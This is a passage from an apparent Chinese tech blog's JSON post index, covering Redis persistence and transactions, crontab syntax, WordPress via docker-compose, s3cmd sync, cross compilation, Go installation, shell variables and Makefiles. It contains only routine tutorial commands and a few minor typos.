两种持久化方式可以单独使用其中一种，但更多情况下是将二者结合使用。 RDB方式RDB方式的持久化是通过快照（snapshotting）完成的，当符合一定条件时Redis会自动将内存中的所有数据生成一份副本并存储在硬盘上，这个过程即为“快照”。Redis会在以下几种情况下对数据进行快照： 根据配置规则进行自动快照； 用户执行SAVE或BGSAVE命令； 执行FLUSHALL命令； 执行复制（replication）时。 AOF（Append Only File）方式当使用Redis存储非临时数据时，一般需要打开AOF持久化来降低进程中止导致的数据丢失。AOF可以将Redis执行的每一条写命令追加到硬盘文件中，这一过程显然会降低 Redis的性能，但是大部分情况下这个影响是可以接受的，另外使用较快的硬盘可以提高 AOF 的性能。 Reference https://redis.io/topics/persistence","comments":true,"categories":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/tags/Redis/"}]},{"title":"【Redis】Redis 事务（Transaction）","date":"2020-05-07T09:13:47.000Z","path":"2020/05/07/【Redis】Redis-事务/","text":"Redis 事务（Transaction）Redis通过 MULTI、EXEC、DISCARD、WATCH 等命令来实现事务（transaction）功能。 All the commands in a transaction are serialized and executed sequentially. It can never happen that a request issued by another client is served in the middle of the execution of a Redis transaction. This guarantees that the commands are executed as a single isolated operation. 事务提供了一种将多个命令请求打包，然后一次性、按顺序串行地（executed sequentially）执行多个命令的机制，并且在事务执行期间，服务器不会中断事务而改去执行其他客户端的命令请求，它会将事务中的所有命令都执行完毕，然后才去处理其他客户端的命令请求。 Either all of the commands or none are processed, so a Redis transaction is also atomic. The EXEC command triggers the execution of all the commands in the transaction, so if a client loses the connection to the server in the context of a transaction before calling the EXEC command none of the operations are performed, instead if the EXEC command is called, all the operations are performed. 以下是一个事务执行的过程，该事务首先以一个MULTI命令为开始，接着将多个命令放入事务当中，最后由 EXEC命令触发这个事务的执行，通过将这个事务提交（commit）给服务器。 UsageA Redis transaction is entered using the MULTI command. The command always replies with OK. At this point the user can issue multiple commands. Instead of executing these commands, Redis will queue them. All the commands are executed once EXEC is called. Calling DISCARD instead will flush the transaction queue and will exit the transaction. 123456789&gt; MULTIOK&gt; INCR fooQUEUED&gt; INCR barQUEUED&gt; EXEC1) (integer) 12) (integer) 1 As it is possible to see from the session above, EXEC returns an array of replies, where every element is the reply of a single command in the transaction, in the same order the commands were issued. When a Redis connection is in the context of a MULTI request, all commands will reply with the string QUEUED (sent as a Status Reply from the point of view of the Redis protocol). A queued command is simply scheduled for execution when EXEC is called. 从TCP 通信角度来分析： 123456789101112127.0.0.1:6379&gt; MULTIOK127.0.0.1:6379&gt; set aaabbbccc 123456QUEUED127.0.0.1:6379&gt; set cccbbbaaa 987654QUEUED127.0.0.1:6379&gt; get aaabbbcccQUEUED127.0.0.1:6379&gt; EXEC1) OK2) OK3) \"123456\" 我们总共执行了5条命令，每条命令都会有对应的TCP通讯（每次通讯都会附上这条命令对应的执行内容）： 这点其实是相比较 pipeline而言的，在 pipeline中，所有command都会缓存在 client，只有当执行 EXEC 命令时，才会进行TCP 通讯。 这也意味着，如果执行大量的 transaction，redis server的memory usage会上升（因为有大量未被执行的command 被缓存在 redis server的memory中）；而如果执行大量的 pipeline（而每个pipeline中执行命令数量不多或者这些命令对应执行后的结果的数据量并不大），这时候并不会消耗很多的redis server memory。 Errors inside a transactionDuring a transaction it is possible to encounter two kind of command errors: A command may fail to be queued, so there may be an error before EXEC is called. For instance the command may be syntactically wrong (wrong number of arguments, wrong command name, …), or there may be some critical condition like an out of memory condition (if the server is configured to have a memory limit using the maxmemory directive). A command may fail after EXEC is called, for instance since we performed an operation against a key with the wrong value (like calling a list operation against a string value). Clients used to sense the first kind of errors, happening before the EXEC call, by checking the return value of the queued command: if the command replies with QUEUED it was queued correctly, otherwise Redis returns an error. If there is an error while queueing a command, most clients will abort the transaction discarding it. However starting with Redis 2.6.5, the server will remember that there was an error during the accumulation of commands, and will refuse to execute the transaction returning also an error during EXEC, and discarding the transaction automatically. Before Redis 2.6.5 the behavior was to execute the transaction with just the subset of commands queued successfully in case the client called EXEC regardless of previous errors. The new behavior makes it much more simple to mix transactions with pipelining, so that the whole transaction can be sent at once, reading all the replies later at once. Errors happening after EXEC instead are not handled in a special way: all the other commands will be executed even if some command fails during the transaction. Discarding the command queueDISCARD can be used in order to abort a transaction. In this case, no commands are executed and the state of the connection is restored to normal. 12345678910&gt; SET foo 1OK&gt; MULTIOK&gt; INCR fooQUEUED&gt; DISCARDOK&gt; GET foo&quot;1&quot; Why Redis does not support roll backs?If you have a relational databases background, the fact that Redis commands can fail during a transaction, but still Redis will execute the rest of the transaction instead of rolling back, may look odd to you. However there are good opinions for this behavior: Redis commands can fail only if called with a wrong syntax (and the problem is not detectable during the command queueing), or against keys holding the wrong data type: this means that in practical terms a failing command is the result of a programming errors, and a kind of error that is very likely to be detected during development, and not in production. Redis is internally simplified and faster because it does not need the ability to roll back. An argument against Redis point of view is that bugs happen, however it should be noted that in general the roll back does not save you from programming errors. For instance if a query increments a key by 2 instead of 1, or increments the wrong key, there is no way for a rollback mechanism to help. Given that no one can save the programmer from his or her errors, and that the kind of errors required for a Redis command to fail are unlikely to enter in production, we selected the simpler and faster approach of not supporting roll backs on errors. Reference https://redis.io/topics/transactions","comments":true,"categories":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/tags/Redis/"}]},{"title":"【Redis】Redis Key长度与性能","date":"2020-05-07T08:35:48.000Z","path":"2020/05/07/【Redis】Redis-Key长度与性能/","text":"Question我们知道，在Redis中，get和set操作的time complexity均为O(1)。然而，当我们提供一个超长的key给Redis时，理论上，Redis需要花费更多内存来存储这个key。 因此，key的长度有没有可能影响Redis的性能呢？ Benchmark Script在key为不同长度（包含的字符长度）时，Redis 的get和set操作的Performance（QPS）测试脚本 123456789#!/bin/bashecho \"Test the length of key in Redis will influence performance...\"for (( c=1; c&lt;=100000000000000; c=c*10 ))do echo \"Current length: $&#123;c&#125;\" redis-cli flushall redis-benchmark -n 1000000 -t set,get -r $&#123;c&#125; -qdone Get 操作 Set 操作 可以发现，Redis 对Key的长度并不敏感，或者说，当key的长度小于100个字符时（这是几乎cover我们正常使用的所有情况），key的长度对 Redis的性能几乎几乎没有任何影响。 但是，值得一提的是，由于总内存空间是一定的，因此，每个key的平均长度越长，可以给value使用的内存空间就相对更少了。 Reference https://redis.io/topics/benchmarks https://stackoverflow.com/questions/6320739/does-name-length-impact-performance-in-redis https://adamnengland.wordpress.com/2012/11/15/redis-performance-does-key-length-matter/","comments":true,"categories":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/tags/Redis/"}]},{"title":"【Linux】Crontab","date":"2020-05-05T13:43:55.000Z","path":"2020/05/05/【Linux】Crontab/","text":"区别Cron: Cron comes from chron, the Greek prefix for ‘time’. Cron is a daemon which runs at the times of system boot. Crontab: Crontab (CRON TABle) is a file which contains the schedule of cron entries to be run and at specified times. File location varies by operating systems. crontab是一个文件（列举了要执行的cron服务的具体内容），也可以指Linux中的crontab 命令。 Cron job or cron schedule: Cron job or cron schedule is a specific set of execution instructions specifying day, time and command to execute. crontab can have multiple execution statements. crond 系统服务crond系统服务提供crontab命令来设定cron服务的。 在linux 系统中，由 crond这个系统服务来控制。Linux 系统上面原本就有非常多的计划性工作，因此这个系统服务是默认启动的。 我们可以看下crond这个系统服务的状态： 1234567891011$ systemctl status crond.service● crond.service - Command Scheduler Loaded: loaded (/usr/lib/systemd/system/crond.service; enabled; vendor preset: enabled) Active: active (running) since Thu 2019-10-24 17:25:53 UTC; 6 months 8 days ago Main PID: 1669 (crond) Tasks: 1 Memory: 1.8M CGroup: /system.slice/crond.service └─1669 /usr/sbin/crond -nWarning: Journal has been rotated since unit was started. Log output is incomplete or unavailable. 启动crontab服务 1$ systemctl start crond.service 查看服务是否已经运行用 1$ ps -ax | grep crond 设置cron服务的两种方法 在命令行中使用 crontab 来管理服务（添加/删除相应的任务），该命令其实会将设置的cron服务存储到 /var/spool/cron/ 目录下（以用户名作为子文件夹名称） 直接编辑/etc/crontab文件，以添加相应的任务 crontab 命令通过crontab 命令，我们可以在固定的间隔时间执行指定的系统指令或 shell script脚本。时间间隔的单位可以是分钟、小时、日、月、周及以上的任意组合。这个命令非常适合周期性的日志分析或数据备份等工作。 crontab 命令格式命令格式 1$ crontab [-u user] file [ -e | -l | -r ] 命令参数： -u user：用来选择当前crontab服务属于某个用户（或者查看某个特定用户的crontab服务）； file：指定 crontab命令文件的路径，表示将该file做为crontab的任务列表文件并载入crontab中。如果在命令行中没有指定这个文件，crontab命令将接受标准输入（键盘）上键入的命令，并将它们载入crontab。 -e：编辑某个用户的crontab文件内容。如果不指定用户，则表示编辑当前用户的crontab文件。 -l：显示某个用户的crontab文件内容，如果不指定用户，则表示显示当前用户的crontab文件内容。 -r：从 /var/spool/cron 目录中删除某个用户的crontab文件（如果sw用户已经存在特定crontab服务，则存在 var/spool/cron/sw 文件夹），如果不指定用户，则默认删除当前用户的crontab文件。 -i：在删除用户的crontab文件时给确认提示。 123456789101112131415# 设定某个用户的cron服务，一般root用户在执行这个命令的时候需要此参数 $ crontab -u# 列出当前用户cron服务的详细内容$ crontab -l# 删除当前用户的crontab服务$ crontab -r# 编辑当前用户的crontab服务$ crontab -e# 比如说查看root的cron设置$ crontab -u root -l# root想删除fred的cron设置$ crontab -u fred -r# 在编辑cron服务时，编辑的内容有一些格式和约定。# 进入vi编辑模式后，编辑的内容一定要符合下面的格式 */1 * * * * ls &gt;&gt; /tmp/ls.txt$ crontab -u root -e crontab文件（任务调度设置文件）的语法123456789101112# Example of job definition:# .---------------- minute (0 - 59)# | .------------- hour (0 - 23)# | | .---------- day of month (1 - 31)# | | | .------- month (1 - 12) OR jan,feb,mar,apr ...# | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat# | | | | |# * * * * * user-name command to be executed分 小时 日 月 星期 用哪个用户身份执行该命令 命令0-59 0-23 1-31 1-12 0-6 user-name command （一行对应一个任务) 每个字段代表的含义如下：ba Minute：每个小时的第几分钟执行该任务 Hour：每天的第几个小时执行该任务 Day：每月的第几天执行该任务 Month：每年的第几个月执行该任务 DayOfWeek：每周的第几天执行该任务（0表示星期天，1表示星期1，以此类推。也可以用英文来表示，sun表示星期天，mon表示星期一…） user-name：用哪个用户身份执行该命令 Command：指定要执行的程序 在这些字段里，除了“Command”是每次都必须指定的字段以外，其它字段皆为可选。 记住几个特殊符号的含义: “*”代表取值范围内的数字 “/”代表”每” “-”代表从某个数字到某个数字 “,”分开几个离散的数字 ​ 举例如下： 5 * * * * ls # 指定每小时的第5分钟执行一次 ls 命令 30 5 * * * ls # 指定每天的 5:30 执行 ls 命令 30 7 8 * * ls # 指定每月8号的7：30分执行 ls 命令 30 5 8 6 * ls # 指定每年的6月8日5：30执行 ls 命令 30 6 * * 0 ls # 指定每星期日的6:30执行 ls 命令。注：0表示星期天，1表示星期1，以此类推。也可以用英文来表示，sun表示星期天，mon表示星期一... 30 3 10,20 * * ls # 每月10号及20号的3：30执行 ls 命令（“,” 用来连接多个不连续的时段） 25 8-11 * * * ls # 每天8-11点的第25分钟执行 ls 命令（“-”用来连接连续的时段） */15 * * * * ls # 每15分钟执行一次 ls 命令 （即每个小时的第0 15 30 45 60分钟执行ls命令） 30 6 */10 * * ls # 每个月中，每隔10天6:30执行一次 ls 命令（即每月的1、11、21、31日是的6：30执行一次 ls 命令） 50 7 * * * root ls # 每天 7:50 以 root 身份执行/etc/cron.daily目录中的所有可执行文件Reference https://blog.csdn.net/capecape/article/details/78515558 https://blog.csdn.net/xiyuan1999/article/details/8160998 https://blog.csdn.net/Hot_VC/article/details/48261195 https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html https://www.jianshu.com/p/838db0269fd0 https://stackoverflow.com/questions/21615673/difference-between-cron-crontab-and-cronjob","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【WordPress】使用Docker创建WordPress 实例","date":"2020-05-05T13:40:31.000Z","path":"2020/05/05/【WordPress】使用Docker创建WordPress-实例/","text":"Create docker-compose.ymlChange into your project directory. For example, if you named your directory my_wordpress: 1cd my_wordpress/ Create a docker-compose.yml file that starts your WordPress blog and a separate MySQL instance with a volume mount for data persistence: 12345678910111213141516171819202122232425262728version: &apos;3.3&apos;services: db: image: mysql:5.7 volumes: - db_data:/var/lib/mysql restart: always environment: MYSQL_ROOT_PASSWORD: somewordpress MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress wordpress: depends_on: - db image: wordpress:latest ports: - &quot;8000:80&quot; restart: always environment: WORDPRESS_DB_HOST: db:3306 WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpress WORDPRESS_DB_NAME: wordpressvolumes: db_data: &#123;&#125; Build the projectNow, run docker-compose up -d from your project directory. This runs docker-compose up in detached mode, pulls the needed Docker images, and starts the wordpress and database containers, as shown in the example below. 12345678910111213141516171819$ docker-compose up -dCreating network &quot;my_wordpress_default&quot; with the default driverPulling db (mysql:5.7)...5.7: Pulling from library/mysqlefd26ecc9548: Pull completea3ed95caeb02: Pull complete...Digest: sha256:34a0aca88e85f2efa5edff1cea77cf5d3147ad93545dbec99cfe705b03c520deStatus: Downloaded newer image for mysql:5.7Pulling wordpress (wordpress:latest)...latest: Pulling from library/wordpressefd26ecc9548: Already existsa3ed95caeb02: Pull complete589a9d9a7c64: Pull complete...Digest: sha256:ed28506ae44d5def89075fd5c01456610cd6c64006addfe5210b8c675881aff6Status: Downloaded newer image for wordpress:latestCreating my_wordpress_db_1Creating my_wordpress_wordpress_1 If you are using Docker Desktop for Mac or Docker Desktop for Windows, you can use http://localhost as the IP address, and open http://localhost:8000 in a web browser. Reference https://docs.docker.com/compose/wordpress/ https://buddy.works/guides/wordpress-docker-kubernetes-part-1","comments":true,"categories":[{"name":"WordPress","slug":"WordPress","permalink":"http://swsmile.info/categories/WordPress/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"http://swsmile.info/tags/WordPress/"}]},{"title":"【AWS】AWS CLI - s3 使用","date":"2020-05-05T13:37:52.000Z","path":"2020/05/05/【AWS】AWS-CLI-s3-使用/","text":"123456789# 两者没有区别$ s3cmd sync --recursive \"/Working/bin\" s3://swtestiznzwbzxihzi --delete-removed$ s3cmd sync --recursive \"/Working/bin\" s3://swtestiznzwbzxihzi/ --delete-removed# 这会把/Working/下的bin/文件夹放到s3://swtestiznzwbzxihzi/的根目录下，比如有/Working/bin/1，s3://swtestiznzwbzxihzi/bin/1 中就是对应的 1文件$ s3cmd sync --recursive \"/Working/bin\" s3://swtestiznzwbzxihzi/ --delete-removed# 这会把/Working/bin/下的所有文件都放到s3://swtestiznzwbzxihzi/的根目录下，比如有/Working/bin/1，s3://swtestiznzwbzxihzi/中就会包含1文件$ s3cmd sync --recursive \"/Working/bin/\" s3://swtestiznzwbzxihzi/ --delete-removed","comments":true,"categories":[{"name":"AWS","slug":"AWS","permalink":"http://swsmile.info/categories/AWS/"}],"tags":[{"name":"AWS","slug":"AWS","permalink":"http://swsmile.info/tags/AWS/"}]},{"title":"【Compile】交叉编译（Cross compiler）","date":"2020-05-05T13:31:26.000Z","path":"2020/05/05/【Compile】交叉编译/","text":"本地编译本地编译可以理解为，在当前编译平台下，编译出来的程序只能放到当前平台下运行。平时我们常见的软件开发，都是属于本地编译： 比如，我们在 x86 平台上，编写程序并编译成可执行程序。这种方式下，我们使用 x86 平台上的工具，开发针对 x86 平台本身的可执行程序，这个编译过程称为本地编译。 交叉编译（Cross compiler）交叉编译可以理解为，在当前编译平台下，编译出来的程序能运行在体系结构不同的另一种目标平台上，但是编译平台本身却不能运行该程序： 比如，我们在 x86 平台上，编写程序并编译成能运行在 ARM 平台的程序，编译得到的程序在 x86 平台上是不能运行的，必须放到 ARM 平台上才能运行。 为什么会有交叉编译之所以要有交叉编译，主要原因是： Speed： 目标平台的运行速度往往比主机慢得多，许多专用的嵌入式硬件被设计为低成本和低功耗，没有太高的性能 Capability： 整个编译过程是非常消耗资源的，嵌入式系统往往没有足够的内存或磁盘空间 Availability： 即使目标平台资源很充足，可以本地编译，但是第一个在目标平台上运行的本地编译器总需要通过交叉编译获得 Flexibility： 一个完整的Linux编译环境需要很多支持包，交叉编译使我们不需要花时间将各种支持包移植到目标板上 Reference https://blog.csdn.net/whatday/article/details/73930604","comments":true,"categories":[{"name":"Compile","slug":"Compile","permalink":"http://swsmile.info/categories/Compile/"}],"tags":[{"name":"Compile","slug":"Compile","permalink":"http://swsmile.info/tags/Compile/"}]},{"title":"【Linux】Ubuntu安装Docker","date":"2020-05-01T05:53:55.000Z","path":"2020/05/01/【Linux】Ubuntu安装Docker/","text":"下载最新版本（https://golang.org/dl/），https://dl.google.com/go/go1.14.2.linux-amd64.tar.gz Extract it into /usr/local, creating a Go tree in /usr/local/go. For example: 1tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz Add /usr/local/go/bin to the PATH environment variable. You can do this by adding this line to your /etc/profile (for a system-wide installation) or $HOME/.profile: 1export PATH=$PATH:/usr/local/go/bin Note: changes made to a profile file may not apply until the next time you log into your computer. To apply the changes immediately, just run the shell commands directly or execute them from the profile using a command such as source $HOME/.profile. Reference https://golang.org/doc/install#install","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Linux】shell变量","date":"2020-04-26T04:40:47.000Z","path":"2020/04/26/【Linux】shell变量/","text":"Shell 支持自定义变量。 定义变量定义变量时，变量名不加美元符号（$），如： 1variableName=&quot;value&quot; 注意，变量名和等号之间不能有空格，这可能和你熟悉的所有编程语言都不一样。同时，变量名的命名须遵循如下规则： 首个字符必须为字母（a-z，A-Z）。 中间不能有空格，可以使用下划线（_）。 不能使用标点符号。 不能使用 bash 里的关键字（可用 help 命令查看保留关键字）。 Bash 没有数据类型的概念，所有的变量值都是字符串。 下面是一些自定义变量的例子。 12345678# 不使用任何引号$ myGender=man# 使用单引号$ myName='Wei Shi'# 使用双引号$ myUrl=\"http://test.com\"# 可以将一个数字赋值给变量$ myNum=100 单引号Bash 允许字符串放在单引号或双引号之中，加以引用。 单引号用于保留字符的字面含义，各种特殊字符在单引号里面，都会变为普通字符，比如星号（*）、美元符号（$）、反斜杠（\\）等。 1str=&apos;this is a string&apos; 这意味着： 单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的； 单引号字串中不能出现单独一个的单引号（对单引号使用转义符后也不行，因为转义字符”\\“也变成了普通字符），但可成对出现（即作为字符串拼接使用）。 1234567891011121314# 单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的$ Downloads a=\"sss\"$ Downloads str='this is a string $a'$ Downloads echo $strthis is a string $a# 单引号字串中不能出现单独一个的单引号（即使对单引号使用转义符后也不行）$ str='this is a string\\' for testing'zsh: parse error near `for'# 单引号字串中的单引号可以成对出现（来实现字符串拼接）$ str='this is a string'' hahaha'$ echo $strthis is a string hahaha 双引号双引号比单引号宽松，可以保留大部分特殊字符的本来含义，但是三个字符除外：美元符号（$）、反引号（Bash 自动扩展。1234567891011121314151617181920```bash# 双引号的引号之间可以使用变量，来进行字符串拼接$ your_name=&quot;Wei&quot;$ str=&quot;Hello, I know you are &quot;$your_name$ echo $strHello, I know you are Wei# 进行字符串拼接$ str=&quot;I am $your_name, Hello&quot;$ echo $strI am Wei, Hello$ str=&quot;I am $&#123;your_name&#125;, Hello&quot;$ echo $strI am Wei, Hello# 双引号里可以出现双引号（通过使用转义字符）$ str=&quot;I am \\&quot;Wei\\&quot;&quot;$ echo $strI am &quot;Wei&quot; 双引号的优点： 双引号的引号之间可以使用变量，来进行字符串拼接 双引号里可以出现双引号（通过使用转义字符） 数值变量赋值需要注意的是 Shell 默认赋值是字符串赋值，因此进行下面的操作： 123$ myAge=20$ myAgeAdd=$myAge+1$ echo $myAgeAdd 会输出： 129+1 在 Bash 中，如果要将算术表达式的数值赋值给一个变量，可以使用 let 命令，如下所示： 12let var=2+1echo $var 此时输出： 13 获取字符串长度123$ string=\"abcd\"$ echo $&#123;#string&#125; 4 提取子字符串以下实例从字符串第 2 个字符开始截取 4 个字符： 123$ string=\"runoob is a great site\"$ echo $&#123;string:1:4&#125; unoo 查找子字符串查找字符 i 或 o 的位置(哪个字母先出现就计算哪个)： 123$ string=\"runoob is a great site\"$ echo \"expr index \"$string\" io\" 4 使用变量使用一个定义过的变量，只要在变量名前面加美元符号（$）即可，如： 123$ your_name=\"wei\"$ echo $your_name$ echo $&#123;your_name&#125; 变量名外面的花括号是可选的，加不加都行，加花括号是为了帮助解释器识别变量的边界，比如下面这种情况： 1234for skill in Ada Coffe Action Java do echo &quot;I am good at $&#123;skill&#125;Script&quot;done 如果不给 skill 变量加花括号，写成 echo “I am good at $skillScript”，解释器就会把 $skillScript 当成一个变量（其值为空），代码执行结果就不是我们期望的样子了。 推荐给所有变量加上花括号，这是个好的编程习惯。 将命令的执行结果赋值给变量12var=`pwd`echo $var 此时输出： 1/Users/wei.shi/Downloads 或者也可以使用$(…)来实现同样的功能 12var=$(pwd)echo $var 将 Bash 的内置命令 read 读入的内容赋值给变量1echo -n &quot;Enter var:&quot;;read var 此时输出： 1Enter var: 此时如果我们输入123，并按回车 1Enter var:123 之后，再输入： 1echo $var 此时输出： 1123 重新定义变量已定义的变量，可以被重新定义，如： 1234$ myUrl=\"http://test.com\"$ echo $&#123;myUrl&#125;$ myUrl=\"http://test1.com\"$ echo $&#123;myUrl&#125; 只读变量使用 readonly 命令可以将变量定义为只读变量，只读变量的值不能被改变。 下面的例子尝试更改只读变量，结果报错： 12345#!/bin/bashmyUrl=\"http://test.com\"readonly myUrlmyUrl=\"http://test1.com\" 运行脚本，结果如下： 1/bin/sh: NAME: This variable is read only. 删除变量使用 unset 命令可以删除变量。语法： 1unset variable_name 变量被删除后不能再次使用；unset 命令不能删除只读变量。 举个例子： 12345#!/bin/shmyUrl=&quot;http://test.com&quot;unset myUrlecho $myUrl 上面的脚本没有任何输出。 变量类型运行 shell 时，会同时存在三种变量： 1) 局部变量 局部变量在脚本或命令中定义，仅在当前 shell 实例中有效，其他 shell 启动的程序不能访问局部变量。 2) 环境变量 所有的程序，包括 shell 启动的程序，都能访问环境变量，有些程序需要环境变量来保证其正常运行。必要的时候 shell 脚本也可以定义环境变量。 3) shell 变量 shell 变量是由 shell 程序设置的特殊变量。shell 变量中有一部分是环境变量，有一部分是局部变量，这些变量保证了 shell 的正常运行 Reference https://wiki.jikexueyuan.com/project/shell-tutorial/shell-variable.html https://www.jianshu.com/p/7fd317a45be5 https://wangdoc.com/bash/variable.html","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Linux】makefile","date":"2020-04-25T14:47:44.000Z","path":"2020/04/25/【Linux】makefile/","text":"Make的概念Make这个词，英语的意思是”制作”。Make命令直接用了这个意思，就是要做出某个文件。比如，要做出文件a.txt，就可以执行下面的命令。 1$ make a.txt 但是，如果你真的输入这条命令，它并不会起作用。因为Make命令本身并不知道，如何做出a.txt，需要有人告诉它，如何调用其他命令完成这个目标（这个人就是我们）。 比如，假设文件 a.txt 依赖于 b.txt 和 c.txt ，是后面两个文件连接（cat命令）的产物。那么，make 需要知道下面的规则。 123# makefile 文件内容a.txt: b.txt c.txt cat b.txt c.txt &gt; a.txt 也就是说，make a.txt 这条命令的背后，实际上分成两步：第一步，确认 b.txt 和 c.txt 必须已经存在，第二步使用 cat 命令 将这个两个文件合并，输出为新文件。 像这样的规则，都写在一个叫做Makefile的文件中，Make命令依赖这个文件进行构建。Makefile文件也可以写为makefile， 或者用命令行参数指定为其他文件名： 123$ make -f rules.txt# 或者$ make --file=rules.txt 上面代码指定make命令依据rules.txt文件中的规则，进行构建。 总之，make只是一个根据指定的Shell命令进行构建的工具。它的规则很简单，你规定要构建哪个文件、它依赖哪些源文件，当那些文件有变动时，如何重新构建它。 Makefile文件的格式构建规则都写在Makefile文件里面，要学会如何Make命令，就必须学会如何编写Makefile文件。 概述Makefile文件由一系列规则（rules）构成。每条规则的形式如下。 123# makefile 文件内容&lt;target&gt; : &lt;prerequisites&gt; [tab] &lt;commands&gt; 上面第一行冒号前面的部分，叫做”目标”（target），冒号后面的部分叫做”前置条件”（prerequisites）；第二行必须由一个tab键起首，后面跟着”命令”（commands）。 “目标”是必需的，不可省略；”前置条件”和”命令”都是可选的，但是两者之中必须至少存在一个。 每条规则就明确两件事：构建目标的前置条件是什么，以及如何构建。下面就详细讲解，每条规则的这三个组成部分。 目标（target）一个目标（target）就构成一条规则。目标通常是文件名，指明Make命令所要构建的对象，比如上文的 a.txt 。目标可以是一个文件名，也可以是多个文件名，之间用空格分隔。 除了文件名，目标还可以是某个操作的名字，这称为”伪目标”（phony target）。 123# makefile 文件内容clean: rm *.o 上面代码的目标是clean，它不是文件名，而是一个操作的名字，属于”伪目标 “，作用是删除对象文件。 1$ make clean 但是，如果当前目录中，正好有一个文件叫做clean，那么这个命令不会执行。因为Make发现clean文件已经存在，就认为没有必要重新构建了，就不会执行指定的rm命令。 为了避免这种情况，可以明确声明clean是”伪目标”，写法如下。 1234# makefile 文件内容.PHONY: cleanclean: rm *.o temp 声明clean是”伪目标”之后，make就不会去检查是否存在一个叫做clean的文件，而是每次运行都执行对应的命令。像.PHONY这样的内置目标名还有不少，可以查看手册。 如果Make命令运行时没有指定目标，默认会执行Makefile文件中定义的第一个目标。 1$ make 上面代码执行Makefile文件的第一个目标。 前置条件（prerequisites）前置条件通常是一组文件名，之间用空格分隔。它指定了”目标”是否重新构建的判断标准：只要有任何一个前置条件（或者称为前置文件）不存在，或者有过更新（前置文件的last-modification时间戳比目标的时间戳新），”目标”就需要重新构建。 123# makefile 文件内容result.txt: source.txt cp source.txt result.txt 上面代码中，构建 result.txt 的前置条件是 source.txt 。因此，当前目录中，如果source.txt 已经存在了，make result.txt才可以正常运行，否则必须再写一条规则，来生成 source.txt 文件。 生成 source.txt 的规则： 123# makefile 文件内容source.txt: echo \"this is the source\" &gt; source.txt 上面代码中，source.txt 规则后面没有前置条件，就意味着它跟其他文件都无关，只要这个文件还不存在，每次调用make source.txt，它都会生成。 1234$ make source.txtecho \"this is the source\" &gt; source.txt$ make source.txtmake: `source.txt' is up to date. 在上面，我们连续执行两次make result.txt。第一次执行会生成 source.txt 文件，然后再新建 result.txt。第二次执行，Make发现 source.txt 没有变动（因为makefile文件的修改时间时间戳早于 source.txt文件的修改时间时间戳），就不会执行任何操作（而只是提示make: source.txt is up to date.）。 如果需要生成多个文件，往往采用下面的写法。 12# makefile 文件内容source: file1 file2 file3 上面代码中，source 是一个伪目标（因为只有三个前置文件，而没有任何对应的命令）。 12$ make sourcemake: *** No rule to make target `file1', needed by `source'. Stop. 执行make source命令后，就会报错了，这是因为 file1 是一个目标，但是没有被声明。 命令（commands）命令（commands）表示如何更新目标文件，由一行或多行的Shell命令组成。它是构建”目标”的具体指令，它的运行结果通常就是生成目标文件。 每行命令之前必须有一个tab键。如果想用其他键，可以用内置变量 .RECIPEPREFIX 声明。 1234# makefile 文件内容.RECIPEPREFIX = &gt;all:&gt; echo Hello, world 上面代码用.RECIPEPREFIX指定，大于号（&gt;）替代tab键。所以，每一行命令的起首变成了大于号，而不是tab键。 需要注意的是，每行命令在一个单独的shell中执行。因此，这些命令是不相互共享context的。 例子： 1234# makefile 文件内容var-lost: export foo=bar echo \"foo=[$$foo]\" 执行： 12$ make var-lostmake: Nothing to be done for `var-lost'. 这是因为，在执行 echo &quot;foo=[$$foo]&quot; 时，取不到变量 foo 的值，所以提示执行 make var-lost 没有做任何事（make: Nothing to be done for var-lost&#39;.）。 取不到foo的值，其实是因为两行命令在两个不同的shell进程执行。 一个解决办法是将两行命令写在一行，中间用分号分隔。 12var-kept: export foo=bar; echo \"foo=$&#123;foo&#125;\" 另一个解决办法是在换行符前加反斜杠转义。 123var-kept: export foo=bar; \\ echo \"foo=$&#123;foo&#125;\" 最后一个方法是加上.ONESHELL:命令。 1234.ONESHELL:var-kept: export foo=bar; echo \"foo=$&#123;foo&#125;\" 一个go project的makefile Demo1234567891011121314151617181920212223242526272829303132333435363738394041COVER_PROFILE=cover.outCOVER_HTML=cover.html.PHONY: $(COVER_PROFILE) $(COVER_HTML)all: openbuild: clean mkdir -p -v ./bin/amm.app/Contents/Resources mkdir -p -v ./bin/amm.app/Contents/MacOS cp ./appInfo/*.plist ./bin/amm.app/Contents/Info.plist cp ./appInfo/*.icns ./bin/amm.app/Contents/Resources/icon.icns go build -o ./bin/amm.app/Contents/MacOS/amm cmd/main.goopen: build open ./binclean: rm -rf ./binstart: go run cmd/main.gotest:coveragecoverage: $(COVER_HTML)$(COVER_HTML): $(COVER_PROFILE) go tool cover -html=$(COVER_PROFILE) -o $(COVER_HTML)$(COVER_PROFILE): go test -v -failfast -race -coverprofile=$(COVER_PROFILE) ./...vet: go vet $(shell glide nv)lint: go list ./... | grep -v vendor | grep -v /assets/ |xargs -L1 golint -set_exit_status.PHONY: build .PHONY: clean Reference http://www.ruanyifeng.com/blog/2015/02/make.html 